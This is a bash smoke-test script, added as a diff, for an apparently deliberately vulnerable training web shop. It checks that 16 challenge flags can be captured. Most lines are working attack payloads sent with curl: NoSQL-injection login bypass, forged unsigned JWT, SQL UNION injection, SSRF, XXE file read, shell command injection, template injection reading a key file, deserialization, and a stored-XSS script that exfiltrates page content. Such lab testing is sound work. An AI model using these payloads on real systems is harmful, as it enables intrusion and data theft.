@@ -1,0 +1,94 @@
+#!/usr/bin/env bash
+# ============================================================
+# CyberShop lab — smoke test
+# Kiểm tra 16 evidence token + master flag đều lấy được.
+#
+# Usage:
+#   ./smoke-test.sh                       # fast checks (~15s), mặc định http://localhost:7110
+#   ./smoke-test.sh https://shop.example  # trỏ sang host khác
+#   WITH_BOT=1 ./smoke-test.sh            # kèm C14 stored-XSS qua bot (+~60s)
+#
+# Exit code: 0 = tất cả PASS, 1 = có FAIL.
+# ============================================================
+set -u
+B="${1:-${BASE_URL:-http://localhost:7110}}"
+BOT_WAIT="${BOT_WAIT:-55}"
+PASS=0; FAIL=0; FAILED=()
+
+echo "== CyberShop smoke test @ $B =="
+
+# --- chuẩn bị session ---
+ATOK=$(curl -s -i -X POST "$B/login" -H 'Content-Type: application/json' \
+  -d '{"email":{"$ne":null},"password":{"$ne":null}}' | grep -oP 'token=\K[^;]+')
+JT=$(curl -s -i -X POST "$B/login" -d 'email=john@cybershop.vn&password=jordan23' | grep -oP 'token=\K[^;]+')
+H=$(printf '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+P=$(printf '{"id":"admin@cybershop.vn","name":"Administrator","role":"admin","exp":9999999999}' \
+  | base64 -w0 | tr '+/' '-_' | tr -d '=')
+DESER=$(printf 'cart=s:empty;theme=s:dark;currency=s:VND;gadget=fn:readFile(/app/data/state-snapshot.dat)' \
+  | base64 -w0)
+
+check() { # NAME FLAG [curl args...]
+  local name="$1" expect="$2"; shift 2
+  local body
+  body="$(curl -s "$@" )"
+  if printf '%s' "$body" | grep -q "FLAG{${expect}}"; then
+    echo "PASS  $name"; PASS=$((PASS+1))
+  else
+    echo "FAIL  $name  (không thấy FLAG{$expect})"; FAIL=$((FAIL+1)); FAILED+=("$name")
+  fi
+}
+
+check C1 c1   "$B/.backup/db-seed.js.bak"
+check C2 c2   -H "Cookie: token=$ATOK" "$B/auth/me"
+check C3 c3   -H "Cookie: token=$H.$P." "$B/admin/api/audit"
+check C4 c4   -X PUT -H "Cookie: token=$ATOK" -H 'Content-Type: application/json' \
+              -d '{"name":"Administrator","role":"admin"}' "$B/api/profile"
+check C5 c5   --get --data-urlencode "q=x' UNION SELECT email,password_hash,1,1 FROM shopusers#" "$B/catalog"
+check C6 c6   -X POST -d 'email=demo@cybershop.vn&code=1337' "$B/auth/otp-verify"
+check C7 c7   -H "Cookie: token=$JT" "$B/orders/1042"
+check C8 c8   "$B/debug"
+check C9 c9   -X POST -H "Cookie: token=$ATOK" -H 'Content-Type: application/json' \
+              -d '{"url":"http://flag-service:8080/flag"}' "$B/profile/avatar"
+check C10 c10 -X POST --data-urlencode 'xml=<!DOCTYPE r [<!ENTITY x SYSTEM "file:///app/flags/c10.txt">]><catalog><product><name>&x;</name><price>1</price></product></catalog>' \
+              "$B/import/xml"
+check C11 c11 -X POST -H "Cookie: token=$ATOK" --data-urlencode 'target=127.0.0.1; cat /opt/scripts/netdiag.secret' \
+              "$B/admin/tools/diag"
+check C12 c12 --get --data-urlencode 'tpl=<%= global.process.mainModule.require("fs").readFileSync("/app/config/session-store.key","utf8") %>' \
+              "$B/invoice/1001"
+check C13 c13 -H "Cookie: shop_state=$DESER" "$B/catalog"
+check C15 c15 "$B/catalog?q=x"
+check C16 c16 -H "Cookie: token=$ATOK" "$B/profile"
+check MASTER owasp_shop_master -X POST -H "Cookie: token=$ATOK" \
+              --data-urlencode 'target=127.0.0.1; cat /flag.txt' "$B/admin/tools/diag"
+
+# --- Objectives page (song ngữ + verify token) ---
+if curl -s "$B/objectives" | grep -q 'obj\|Mục tiêu\|Objective'; then
+  echo "PASS  OBJ-page"; PASS=$((PASS+1))
+else
+  echo "FAIL  OBJ-page"; FAIL=$((FAIL+1)); FAILED+=("OBJ-page")
+fi
+OBJV=$(curl -s -X POST "$B/objectives/check" -d 'flag=FLAG{c5}')
+OBJE=$(curl -s -X POST "$B/objectives/check" -H 'Cookie: lang=en' -d 'flag=FLAG{c5}')
+if printf '%s' "$OBJV" | grep -q 'HOÀN THÀNH MỤC TIÊU' && printf '%s' "$OBJE" | grep -q 'OBJECTIVE COMPLETED'; then
+  echo "PASS  OBJ-verify (vi+en)"; PASS=$((PASS+1))
+else
+  echo "FAIL  OBJ-verify (vi+en)"; FAIL=$((FAIL+1)); FAILED+=("OBJ-verify")
+fi
+
+# --- C14: stored XSS + moderation bot (chậm) ---
+if [[ "${WITH_BOT:-0}" == "1" ]]; then
+  echo "-- C14: trồng review payload, chờ bot ${BOT_WAIT}s --"
+  curl -s -o /dev/null -X POST "$B/product/1/review" -H "Cookie: token=$ATOK" \
+    --data-urlencode 'rating=5' \
+    --data-urlencode 'text=<script>fetch("/api/notes",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:"EXFIL:"+document.querySelector("code").textContent})})</script>'
+  sleep "$BOT_WAIT"
+  if curl -s "$B/notes" | grep -q 'EXFIL:FLAG{c14}'; then
+    echo "PASS  C14-exfil"; PASS=$((PASS+1))
+  else
+    echo "FAIL  C14-exfil (bot chưa exfil hoặc payload sai)"; FAIL=$((FAIL+1)); FAILED+=("C14-exfil")
+  fi
+fi
+
+echo "== Kết quả: $PASS PASS / $FAIL FAIL =="
+[[ $FAIL -gt 0 ]] && printf 'FAIL: %s\n' "${FAILED[*]}"
+exit $(( FAIL > 0 ? 1 : 0 ))
